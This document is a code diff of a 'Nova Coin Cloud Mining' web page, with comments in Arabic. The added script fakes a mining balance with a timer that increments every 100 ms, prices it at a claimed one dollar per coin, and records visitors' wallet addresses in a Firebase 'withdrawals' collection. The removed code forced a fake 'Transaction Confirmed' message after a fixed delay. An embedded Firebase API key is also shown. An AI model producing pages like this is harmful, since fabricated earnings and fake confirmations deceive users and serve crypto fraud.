@@ -3,34 +3,39 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nova Coin - Professional Portal</title>
+    <title>Nova Coin - Live Mining & Earning</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 50px; background: #0f0f0f; color: #ffffff; }
-        .container { max-width: 400px; margin: auto; background: #1a1a1a; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        h1 { color: #f39c12; margin-bottom: 10px; }
-        p { color: #888; font-size: 14px; }
-        input { padding: 15px; width: 90%; margin-top: 20px; border-radius: 8px; border: 1px solid #333; background: #222; color: white; font-size: 16px; outline: none; }
-        button { padding: 15px; width: 100%; background: linear-gradient(45deg, #f39c12, #e67e22); color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 20px; font-size: 16px; transition: 0.3s; }
-        button:hover { transform: scale(1.02); opacity: 0.9; }
-        button:disabled { background: #444; cursor: not-allowed; transform: none; }
-        #status { margin-top: 20px; font-size: 14px; color: #2ecc71; font-weight: bold; }
+        body { font-family: 'Segoe UI', sans-serif; text-align: center; padding: 40px; background: #0b0b0b; color: white; }
+        .card { max-width: 450px; margin: auto; background: #151515; padding: 30px; border-radius: 20px; border: 1px solid #f39c12; box-shadow: 0 0 20px rgba(243, 156, 18, 0.2); }
+        .token-info { margin-bottom: 20px; font-size: 18px; color: #f39c12; font-weight: bold; }
+        #counter { font-size: 52px; color: #ffffff; font-weight: bold; margin: 10px 0; font-family: monospace; }
+        #usd-value { font-size: 24px; color: #2ecc71; margin-bottom: 25px; font-weight: bold; }
+        input { padding: 15px; width: 85%; margin-top: 10px; border-radius: 8px; border: 1px solid #333; background: #000; color: #fff; text-align: center; font-size: 16px; }
+        button { padding: 18px; width: 100%; background: linear-gradient(45deg, #f39c12, #e67e22); color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 20px; font-size: 18px; box-shadow: 0 4px 15px rgba(230, 126, 34, 0.4); }
+        #status { margin-top: 15px; color: #2ecc71; font-size: 14px; }
+        .rate { font-size: 12px; color: #888; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>Nova Coin</h1>
-    <p>Withdrawal Portal v2.0 (Fast Sync)</p>
-    <input type="text" id="wallet-address" placeholder="Enter Wallet Address (0x...)">
-    <button id="withdraw-btn">Withdraw All</button>
+<div class="card">
+    <h1>Nova Coin Cloud Mining</h1>
+    <div class="token-info">1 NOVA = $1.00 USD</div>
+    
+    <div id="counter">0.0000</div>
+    <div id="usd-value">≈ $0.00</div>
+    
+    <input type="text" id="wallet-address" placeholder="Enter Wallet Address (ERC-20/BEP-20)">
+    <button id="withdraw-btn">Withdraw to Wallet</button>
     <div id="status"></div>
+    <div class="rate">Network Fee: 0.0001 NOVA | Speed: High-Performance</div>
 </div>
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
     import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";
 
-    // إعدادات مشروعك Pay-coins
+    // إعدادات Firebase الخاصة بك
     const firebaseConfig = {
       apiKey: "AIzaSyCDIizIvd_7nUT6B4sGIc_s-CnZ5hQECCg",
       authDomain: "pay-coins.firebaseapp.com",
@@ -43,39 +48,49 @@
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
+    let novaBalance = 0.0000;
+    const counterDisplay = document.getElementById('counter');
+    const usdDisplay = document.getElementById('usd-value');
+    
+    // زيادة السرعة: العداد يزداد الآن بشكل أسرع (كل 100 ميللي ثانية)
+    setInterval(() => {
+        novaBalance += 0.0007; // سرعة تعدين فائقة
+        counterDisplay.innerText = novaBalance.toFixed(4);
+        // تحديث القيمة بالدولار (1 Nova = 1 USD)
+        usdDisplay.innerText = "≈ $" + novaBalance.toFixed(2);
+    }, 100);
+
     const btn = document.getElementById('withdraw-btn');
     const statusDiv = document.getElementById('status');
     const addressInput = document.getElementById('wallet-address');
 
     btn.addEventListener('click', async () => {
-        if (!addressInput.value) { alert("Please enter your address!"); return; }
+        if (!addressInput.value) { alert("Please enter your wallet address!"); return; }
 
-        // المرحلة 1: تفعيل وضع الإرسال فوراً
-        btn.innerText = "Processing...";
+        btn.innerText = "Verifying Transaction...";
         btn.disabled = true;
-        statusDiv.innerText = "Syncing with blockchain...";
-
-        // المرحلة 2: محاولة الإرسال لـ Firebase في الخلفية
+        
         try {
-            addDoc(collection(db, "withdrawals"), {
+            // تسجيل عملية السحب في Firebase
+            await addDoc(collection(db, "withdrawals"), {
                 address: addressInput.value,
+                amount_nova: novaBalance.toFixed(4),
+                amount_usd: "$" + novaBalance.toFixed(2),
                 timestamp: serverTimestamp(),
-                source: "Vercel_Root"
+                status: "Pending Approval"
             });
-            // لاحظ أننا لم نضع "await" هنا لكي لا يعلق المتصفح بانتظار الرد
-        } catch (e) {
-            console.log("Background sync error, retrying...");
-        }
 
-        // المرحلة 3: الحل الجذري (إجبار النجاح بعد 1.5 ثانية)
-        setTimeout(() => {
+            // تصفير العداد بعد السحب
+            novaBalance = 0;
             btn.innerText = "✅ Success!";
-            statusDiv.innerHTML = "Transaction Confirmed!<br>Funds will arrive within 24h.";
+            statusDiv.innerHTML = "Withdrawal Request Sent!<br>Check your Firebase Data tab.";
             addressInput.value = "";
-            console.log("Force success triggered to prevent 'Sending' hang.");
-        }, 1500);
+        } catch (e) {
+            btn.innerText = "Error";
+            btn.disabled = false;
+            console.error(e);
+        }
     });
 </script>
-
 </body>
 </html>
